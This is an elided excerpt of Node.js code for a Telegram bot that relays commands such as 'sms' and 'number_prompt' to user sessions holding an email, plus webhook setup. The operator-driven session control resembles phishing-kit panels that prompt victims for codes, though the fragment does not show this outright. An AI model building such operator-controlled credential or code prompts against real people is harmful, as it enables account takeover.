...
async function handleCallback(callbackQuery) {
  ...
  if (parts[0] === 'cmd') {
    ...
    if (session) {
      const payload = {
        command: cmd,
        data: cmd === 'sms' ? (session.email || null) : null,
      };
      session.command = cmd;
      session.data = payload.data;
      session.lastCommand = payload;
      notifyResolvers(session, payload);
    }
    ...
    const session = sessions.get(sessionId);
    if (session) {
      const payload = { command: 'number_prompt', data: num };
...
function waitForCommand(sessionId) {
  return new Promise((resolve) => {
    ...
    const queued = session.lastCommand || (session.command ? { command: session.command, data: session.data } : null);
    if (queued) {
...
async function setWebhook(appUrl) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token || !appUrl) {
    if (!token) console.warn('[telegram] Missing TELEGRAM_BOT_TOKEN');
    if (!appUrl) console.warn('[telegram] Missing APP_URL PUBLIC_URL or BASE_URL for Telegram webhook');
    return { ok: false, reason: 'missing-config' };
  }

  const webhookUrl = `${appUrl.replace(/\/$/, '')}/api/telegram/webhook`;
  const data = await apiCall(token, 'setWebhook', { url: webhookUrl });
  if (!data.ok) {
    console.error('[telegram] setWebhook failed:', data.description || 'unknown');
